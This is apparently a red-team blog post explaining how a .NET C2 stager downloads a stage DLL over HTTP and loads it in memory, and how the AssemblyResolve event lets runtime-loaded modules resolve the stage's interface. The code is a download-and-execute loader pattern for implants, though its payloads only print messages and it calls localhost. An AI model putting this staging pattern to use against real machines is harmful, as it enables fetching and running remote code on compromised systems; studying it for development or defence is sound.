---
title: "AppDomain.AssemblyResolve"
date: 2020-12-21T12:06:54Z
draft: false
authors:
    - RastaMouse
---

### Intro

[Jean Maes](https://twitter.com/Jean_Maes_1994) posted a blog entitled "[A tale of .NET assemblies, cobalt strike size constraints, and reflection](https://redteamer.tips/a-tale-of-net-assemblies-cobalt-strike-size-constraints-and-reflection/)", which looked at how to use the [AssemblyResolve](https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.assemblyresolve?view=net-5.0) event to locate .NET dependancies at runtime that were not already weaved into an assembly or located in the [GAC](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/gac).

For a decent background, I encourage readers to review Jean's post.  Since the author credits me for pointing them towards the event, I thought it would be informative to write about the scenario under which I came across it.

### .NET "Stagers", "Stages" and "Modules"

It all started one sunny morning (although I live in the UK so let's face it, it was probably raining) when I was thinking about how I could implement stagers and modules in [SharpC2](https://github.com/SharpC2/SharpC2) (my .NET C2 framework).  I won't use the SharpC2 codebase because it's a little too much to get into just for the purposes of this post, so I'll use some more simplistic examples instead.

The "stage" or "implant" is the main payload that contains all the functionality and logic we need to operate on a compromised machine.  At a minimum, this probably includes the ability to talk to a server, retrieve jobs, execute those jobs and send the results back.  One challenge with implants is that the more complex they become, the larger their filesize and the harder they become to deliver (e.g. during initial compromise).  Stagers are one solution to this problem - as they are tiny programs that can be delivered with the sole responsibility of pulling and loading the main stage.

Let's write a very simpe stage and stager:

#### Stage (.NET Class Library)
```c#
using System;

namespace Stage
{
    public class StageEntry
    {
        public static void Execute()
        {
            Console.WriteLine("[+] Hello from Stage");
        }
    }
}
```

#### Stager (.NET Console Application)
```c#
using System;
using System.Net;
using System.Reflection;

namespace Stager
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+] Hello from Stager");
            Console.WriteLine("[+] Loading Stage...");

            using (var client = new WebClient())
            {
                var uri = new Uri("http://localhost:8000/stage.dll");
                var stage = client.DownloadData(uri);
                var asm = Assembly.Load(stage);
                asm.GetType("Stage.StageEntry").GetMethod("Execute").Invoke(null, new object[] { });
            }
        }
    }
}
```

This works as expected - the stager downloads and executes the stage.

```text
C:\>Stager.exe
[+] Hello from Stager
[+] Loading Stage...
[+] Hello from Stage
```

Now, one of the design decisions that were made regarding the SharpC2 implant was to make it extensible at runtime.  If the operator needed to push some new capability that was not "native" to the implant, then we wanted a means to provide that functionality.  To that end, we designed an interface on the implant that 3rd party modules could implement.

#### Module (.NET Class Library)

The exact implemention of the interface is not important - to demonstrate, we can use:

```c#
namespace Stage
{
    public interface IAgentModule
    {
        void Test();
    }
}
```

Then the module would look like this (note that it's a separate project in Visual Studio with a reference to the Stage project):

```c#
using Stage;
using System;

namespace Module
{
    public class AgentModule : IAgentModule
    {
        public void Test()
        {
            Console.WriteLine("[+] Hello from Module");
        }
    }
}
```

We shall now change the `Execute` method within the stage to:

```c#
public static void Execute()
{
    Console.WriteLine("[+] Hello from Stage");
    Console.WriteLine("[+] Loading Module...");

    using (var client = new WebClient())
    {
        var uri = new Uri("http://localhost:8000/module.dll");
        var bytes = client.DownloadData(uri);

        var asm = Assembly.Load(bytes);
        var instance = asm.CreateInstance("Module.AgentModule", true);

        if (instance is IAgentModule module)
        {
            module.Test();
        }
        else
        {
            Console.WriteLine("[-] Module does not implement IAgentModule");
        }
    }
}
```

However, if we run the stager, we get the following:

```text
C:\>Stager.exe
[+] Hello from Stager
[+] Loading Stage...
[+] Hello from Stage
[+] Loading Module...
[-] Module does not implement IAgentModule
```

### AppDomain.AssemblyResolve

It appears that the assembly is failing to locate `IAgentModule`, and this is finally where we get to the `AssemblyResolve` event.  If we place a breakpoint around `if (asm is IAgentModule)`, we can use the Immediate Window in Visual Studio to do some poking around.

```text
Assembly.GetCallingAssembly().FullName
"Stager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"

AppDomain.CurrentDomain.FriendlyName
"Stager.exe"
```

We can see that our current AppDomain is that of stager.exe and stager is the current calling assembly.  Since the `IAgentInterface` is part of the **stage**, this explains why the resolution is failing.  All we have to do is register the AssemblyResolve callback to get an instance of the stage assembly where resolution will succeed.

```c#
AppDomain.CurrentDomain.AssemblyResolve += AssemblyResolveCallback;
```

And the method to handle this callback:

```c#
static Assembly AssemblyResolveCallback(object sender, ResolveEventArgs args) => Assembly.GetExecutingAssembly();
```

Even though stager is the calling assembly, stage is the executing assembly.  The stage in full is now:

```c#
using System;
using System.Net;
using System.Reflection;

namespace Stage
{
    public class StageEntry
    {
        public static void Execute()
        {
            Console.WriteLine("[+] Hello from Stage");
            Console.WriteLine("[+] Loading Module...");

            using (var client = new WebClient())
            {
                var uri = new Uri("http://localhost:8000/module.dll");
                var bytes = client.DownloadData(uri);

                AppDomain.CurrentDomain.AssemblyResolve += AssemblyResolveCallback;

                var asm = Assembly.Load(bytes);
                var instance = asm.CreateInstance("Module.AgentModule", true);

                if (instance is IAgentModule module)
                {
                    module.Test();
                }
                else
                {
                    Console.WriteLine("[-] Module does not implement IAgentModule");
                }
            }
        }

        static Assembly AssemblyResolveCallback(object sender, ResolveEventArgs args) => Assembly.GetExecutingAssembly();
    }
}
```

And now we get:

```text
C:\>Stager.exe
[+] Hello from Stager
[+] Loading Stage...
[+] Hello from Stage
[+] Loading Module...
[+] Hello from Module
```